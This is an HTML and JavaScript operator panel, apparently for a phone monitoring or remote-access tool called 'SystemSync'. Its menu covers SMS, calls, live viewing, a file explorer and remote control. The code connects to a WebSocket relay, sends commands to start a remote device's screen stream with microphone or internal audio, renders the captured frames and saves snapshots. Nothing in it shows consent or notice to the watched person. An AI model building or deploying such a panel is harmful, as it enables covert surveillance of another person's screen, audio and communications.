<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync - Professional Panel</title>
    <style>
        :root {
            --sidebar-bg: #34495e;
            --active-teal: #1abc9c;
            --main-bg: #f4f7f6;
            --header-bg: #ffffff;
        }

        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: var(--main-bg); overflow: hidden; }

        /* Sidebar Styling */
        #sidebar { width: 250px; background: var(--sidebar-bg); color: #ecf0f1; display: flex; flex-direction: column; flex-shrink: 0; }
        .nav-item { padding: 15px 20px; cursor: pointer; display: flex; align-items: center; border-bottom: 1px solid #2c3e50; transition: 0.3s; }
        .nav-item:hover { background: #2c3e50; }
        .nav-item.active { background: var(--active-teal); border-left: 5px solid white; }
        .nav-item i { margin-right: 15px; width: 20px; text-align: center; }

        /* Main Content Area */
        #main-wrapper { flex-grow: 1; display: flex; flex-direction: column; overflow: hidden; }

        /* Fixed Top Header (Status Bar) */
        header { 
            height: 60px; background: var(--header-bg); border-bottom: 1px solid #ddd; 
            display: flex; align-items: center; justify-content: space-between; padding: 0 30px; 
        }
        .battery-container { display: flex; align-items: center; font-weight: bold; color: #555; }
        #battery-icon { font-size: 24px; margin-right: 8px; }

        /* Content Container */
        #content-area { padding: 30px; flex-grow: 1; overflow-y: auto; }

        /* Live Viewing UI (from your screenshot) */
        .live-card { background: white; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
        .mode-selector { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; }
        .mode-box { 
            border: 1px solid #ddd; padding: 20px; width: 100px; border-radius: 5px; cursor: pointer;
            display: flex; flex-direction: column; align-items: center; position: relative;
        }
        .mode-box.selected { border-color: var(--active-teal); background: #f0ffff; }
        .mode-box .check { position: absolute; top: 5px; right: 5px; color: var(--active-teal); display: none; }
        .mode-box.selected .check { display: block; }
        
        .controls-row { margin: 15px 0; }
        select { padding: 10px; width: 300px; border: 1px solid #ddd; border-radius: 4px; }
        
        .start-btn { 
            background: #2980b9; color: white; border: none; padding: 12px 40px; 
            font-size: 16px; border-radius: 4px; cursor: pointer; margin-top: 20px;
        }

        /* Screen Display (Hidden until Start) */
        #screen-view { display: none; flex-direction: column; align-items: center; }
        #display-canvas { background: black; border: 10px solid #333; border-radius: 10px; max-width: 100%; height: 500px; }

        /* Toast Message */
        #toast { 
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
            background: #f39c12; color: white; padding: 15px 30px; border-radius: 5px; 
            display: none; z-index: 1000; font-weight: bold;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

    <div id="sidebar">
        <div class="nav-item"><i class="fas fa-tachometer-alt"></i> Dashboard</div>
        <div class="nav-item"><i class="fas fa-envelope"></i> SMS</div>
        <div class="nav-item"><i class="fas fa-phone"></i> Calls</div>
        <div class="nav-item active"><i class="fas fa-video"></i> Live viewing</div>
        <div class="nav-item"><i class="fas fa-folder"></i> File Explorer</div>
        <div class="nav-item"><i class="fas fa-cog"></i> Remote control</div>
    </div>

    <div id="main-wrapper">
        <header>
            <div id="device-name"><strong>Device:</strong> <span id="status-indicator" style="color: red;">OFFLINE</span></div>
            <div class="battery-container">
                <i id="battery-icon" class="fas fa-battery-half"></i>
                <span id="battery-level">--%</span>
                <span id="charging-status" style="margin-left: 10px; font-size: 12px;"></span>
            </div>
        </header>

        <div id="content-area">
            <div id="setup-view" class="live-card">
                <div class="mode-selector">
                    <div class="mode-box"><i class="fas fa-video fa-2x" style="color: #e67e22;"></i><br>VIDEO</div>
                    <div class="mode-box"><i class="fas fa-microphone fa-2x" style="color: #9b59b6;"></i><br>AUDIO</div>
                    <div class="mode-box selected">
                        <i class="fas fa-check-circle check"></i>
                        <i class="fas fa-desktop fa-2x" style="color: #e74c3c;"></i><br>SCREEN
                    </div>
                </div>

                <div class="controls-row">
                    <select id="audio-select">
                        <option value="none">No sound</option>
                        <option value="mic">Microphone</option>
                        <option value="internal">Internal Audio</option>
                    </select>
                </div>

                <div class="controls-row">
                    <select>
                        <option>1 minute (1 session)</option>
                        <option>5 minutes</option>
                        <option>Unlimited</option>
                    </select>
                </div>

                <div class="controls-row">
                    Record <input type="checkbox" id="auto-record-toggle">
                </div>

                <button class="start-btn" onclick="startLiveStream()">▶ START</button>
            </div>

            <div id="screen-view">
                <div style="margin-bottom: 10px;">
                    <button onclick="stopLiveStream()" style="background:#e74c3c; color:white; border:none; padding:8px 15px; border-radius:4px;">EXIT VIEW</button>
                    <button onclick="takeScreenshot()" style="background:#3498db; color:white; border:none; padding:8px 15px; border-radius:4px; margin-left:10px;">SNAPSHOT</button>
                </div>
                <canvas id="display-canvas"></canvas>
            </div>
        </div>
    </div>

    <div id="toast">Enable the Start screen first</div>

    <script>
        const socket = new WebSocket('wss://mirror-view.onrender.com');
        const canvas = document.getElementById('display-canvas');
        const ctx = canvas.getContext('2d');
        let isStreaming = false;

        socket.onmessage = (event) => {
            const data = event.data;

            // 1. Handle Battery and Status Updates
            if (data.startsWith("STATUS_DATA:")) {
                // Expected format from device: "STATUS_DATA:ONLINE|85|CHARGING"
                const parts = data.substring(12).split("|");
                updateDeviceUI(parts[0], parts[1], parts[2]);
            }

            // 2. Handle Screen Frames
            if (data.startsWith("FRAME:") && isStreaming) {
                const img = new Image();
                img.onload = () => {
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0);
                };
                img.src = "data:image/jpeg;base64," + data.substring(6);
            }
        };

        function updateDeviceUI(status, battery, chargeState) {
            const ind = document.getElementById('status-indicator');
            ind.innerText = status;
            ind.style.color = (status === "ONLINE") ? "#2ecc71" : "red";

            document.getElementById('battery-level').innerText = battery + "%";
            const icon = document.getElementById('battery-icon');
            
            // Change icon based on level
            if (battery > 80) icon.className = "fas fa-battery-full";
            else if (battery > 20) icon.className = "fas fa-battery-half";
            else icon.className = "fas fa-battery-quarter";

            document.getElementById('charging-status').innerText = (chargeState === "CHARGING") ? "⚡ Charging" : "";
        }

        function startLiveStream() {
            const audioEnabled = document.getElementById('audio-select').value !== "none";
            // Send command with audio flag
            socket.send("START_SCREEN" + (audioEnabled ? "_WITH_AUDIO" : ""));
            
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('screen-view').style.display = 'flex';
            isStreaming = true;
        }

        function stopLiveStream() {
            socket.send("STOP_SCREEN");
            document.getElementById('setup-view').style.display = 'block';
            document.getElementById('screen-view').style.display = 'none';
            isStreaming = false;
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        }

        function takeScreenshot() {
            const link = document.createElement('a');
            link.download = `capture_${Date.now()}.png`;
            link.href = canvas.toDataURL();
            link.click();
        }

        socket.onopen = () => socket.send("GET_STATUS");
    </script>
</body>
</html>
